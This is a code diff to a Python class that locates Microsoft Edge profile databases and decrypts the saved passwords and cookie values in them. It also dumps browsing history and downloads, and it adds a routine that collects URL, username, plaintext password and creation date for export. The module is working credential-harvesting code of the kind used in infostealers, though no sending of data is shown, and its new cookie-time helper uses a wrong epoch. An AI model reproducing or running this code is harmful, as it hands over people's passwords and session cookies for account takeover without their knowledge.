@@ -8,6 +8,7 @@ import win32crypt
 import shutil
 from Cryptodome.Cipher import AES
 import browser_cookie3
+from datetime import timezone
 import datetime
 
 class MicrosoftEdge:
@@ -27,13 +28,16 @@ class MicrosoftEdge:
         return dt_object
     
     def convert_size(self,size_bytes):
-        suffixes = ['B', 'KB', 'MB', 'GB']
-        suffix_index = 0
-        size = float(size_bytes)
-        while size >= 1024 and suffix_index < len(suffixes) - 1:
-            size /= 1024
-            suffix_index += 1
-        return f"{size:.2f} {suffixes[suffix_index]}"
+        try:
+            suffixes = ['B', 'KB', 'MB', 'GB']
+            suffix_index = 0
+            size = float(size_bytes)
+            while size >= 1024 and suffix_index < len(suffixes) - 1:
+                size /= 1024
+                suffix_index += 1
+            return f"{size:.2f} {suffixes[suffix_index]}"
+        except Exception as e:
+            return e
     
     def get_encrypted_key(self):  
         try:
@@ -75,17 +79,20 @@ class MicrosoftEdge:
                         db = self.get_db(login_data_path)
                         if (encrypted_key and db):
                             cursor = db.cursor()
-                            cursor.execute("select action_url, username_value, password_value from logins")
+                            cursor.execute("select action_url, username_value, password_value,date_created from logins order by date_created desc")
                             for index, login in enumerate(cursor.fetchall()):
                                 url = login[0]
                                 username = login[1]
                                 ciphertext = login[2]
+                                creation = self.edge_date_time(login[3])
                                 if (url != "" and username != "" and ciphertext != ""):
                                     decrypted_pass = self.decrypt_password(ciphertext, encrypted_key)
-                                    message = str(index) + " " + ("=" * 50+"\n")
-                                    message += f"URL: {url}\n"
+                                    message = f"URL: {url}\n"
                                     message += f"Username: {username}\n"
-                                    message += f"Password: {decrypted_pass}\n\n"
+                                    message += f"Password: {decrypted_pass}\n"
+                                    message += f"Creation date: {creation}\n\n"
+                                   
+                                    
                                     credentials += message 
                         # Remove the temporary file
                         cursor.close()
@@ -96,7 +103,48 @@ class MicrosoftEdge:
         except Exception as e:
             return e
         
-    def edge_cookies(self):
+    def edge_credentials_to_excel(self):
+        try:
+            if self.get_edge_install():
+                credentials = []
+                if (os.path.exists(self.home_path) and os.path.exists(self.home_path + r"\Local State")):
+                    encrypted_key = self.get_encrypted_key()
+                    folders = [item for item in os.listdir(self.home_path) if re.search("^Profile*|^Default$", item) != None]
+                    for folder in folders:
+                        # Get data from the Login Data file (SQLite database)
+                        login_data_path = os.path.normpath(fr"{self.home_path}\{folder}\Login Data")
+                        db = self.get_db(login_data_path)
+                        if (encrypted_key and db):
+                            cursor = db.cursor()
+                            cursor.execute("select action_url, username_value, password_value , date_created from logins order by date_created desc")
+                            for index, login in enumerate(cursor.fetchall()):
+                                url = login[0]
+                                username = login[1]
+                                ciphertext = login[2]
+                                creation = self.edge_date_time(login[3])
+                                if (url != "" and username != "" and ciphertext != ""):
+                                    decrypted_pass = self.decrypt_password(ciphertext, encrypted_key)
+                                    message = [index,url,username,decrypted_pass, creation]
+                                    credentials.append(message)  
+                        # Remove the temporary file
+                        cursor.close()
+                        db.close()
+                        os.remove("login_data_copy.db")
+                return  credentials
+            return "Microsoft Edge is not installed!!!"
+        except Exception as e:
+            return e
+    
+    def convert_edge_cookie_time(self,expiry_time):
+        try:
+            epoch_start = datetime.datetime(1971, 1, 1,tzinfo=timezone.utc)
+            # expiry_time = int(expiry_time) / 10000000
+            expiry_datetime = epoch_start + datetime.timedelta(seconds=expiry_time)
+            return expiry_datetime.strftime('%Y-%m-%d %H:%M:%S')
+        except Exception as e:
+            return f"Error: {e}"
+        
+    def get_edge_cookies(self):
         try:
             if self.get_edge_install():
                 cookies_data = ""
@@ -135,13 +183,14 @@ class MicrosoftEdge:
                     new_data = shutil.copy2(history_path,"history.db")
                     conn = sqlite3.connect(new_data)
                     curs = conn.cursor()
-                    curs.execute("SELECT url, title, last_visit_time From urls")
+                    curs.execute("SELECT url, title, last_visit_time From urls order by last_visit_time desc")
                     resluts=curs.fetchall()
                     for result in resluts:
-                        # print(result)
-                        hist= f"Url: {result[0]}\n"
-                        hist+= f"Title: {result[1]}\n"
-                        visit_time = self.edge_date_time(result[2])
+                        url=result[0]
+                        title=result[1]
+                        visit_time=self.edge_date_time(result[2])
+                        hist= f"Url: {url}\n"
+                        hist+= f"Title: {title}\n"
                         hist+= f"Visite Time: { visit_time}\n\n"
                         historical +=hist
                     curs.close()
@@ -161,7 +210,7 @@ class MicrosoftEdge:
                     new_data = shutil.copy2(history_path,"history.db")
                     conn = sqlite3.connect(new_data)
                     curs = conn.cursor()
-                    curs.execute("SELECT current_path, target_path, start_time,end_time, received_bytes,total_bytes,referrer,tab_url,tab_referrer_url,last_modified,mime_type,original_mime_type  FROM downloads")
+                    curs.execute("SELECT current_path, target_path, start_time,end_time, received_bytes,total_bytes,referrer,tab_url,tab_referrer_url,last_modified,mime_type,original_mime_type  FROM downloads order by end_time desc")
                     resluts=curs.fetchall()
                     # print(resluts)
                     for result in resluts:
@@ -188,7 +237,45 @@ class MicrosoftEdge:
                 return "Microsoft Edge is not installed!!!"
         except Exception as e:
             return e
-            
+        
+    def get_file_path(self, paths):
+        try:
+            if self.get_edge_install():
+                for root, dirs, files in os.walk(self.home_path):
+                    for file in files:
+                        if file==paths:
+                            return os.path.join(root, file)
+        except Exception as e:
+            return e
+        
+    def edge_cookies(self):
+        try:
+            if self.get_edge_install():
+                encrypted_key = self.get_encrypted_key()
+                cookies_data =""
+                cookies_path= self.get_file_path("Cookies")
+                if cookies_path:
+                    shutil.copy2(cookies_path, "cookies.db")
+                    conn= sqlite3.connect("cookies.db")
+                    connect= conn.cursor()
+                    connect.execute("SELECT name, host_key,encrypted_value, creation_utc, expires_utc, last_access_utc, source_port FROM cookies")
+                    rows = connect.fetchall()
+                    for row in rows:
+                        message= f"Cookies Name: {row[0]}\n"
+                        message +=f"Domain Name: {row[1]}\n"
+                        message +=f"Cookies value : {self.decrypt_password(row[2],encrypted_key)}\n"
+                        message +=f"Creation date: {self.edge_date_time(row[3])}\n"
+                        message +=f"Expire date: {self.edge_date_time(row[4])}\n"
+                        message +=f"Last Access date: {self.edge_date_time(row[5])}\n"
+                        message +=f"Source port: {row[6]}\n\n"
+                        cookies_data += message
+                    connect.close()
+                    conn.close()
+                    os.unlink("cookies.db")
+                    return cookies_data 
+        except Exception as e:
+            return e      
+                
 edge_browser = MicrosoftEdge()
-
+# print(edge_browser.get_edge_cookies())
 
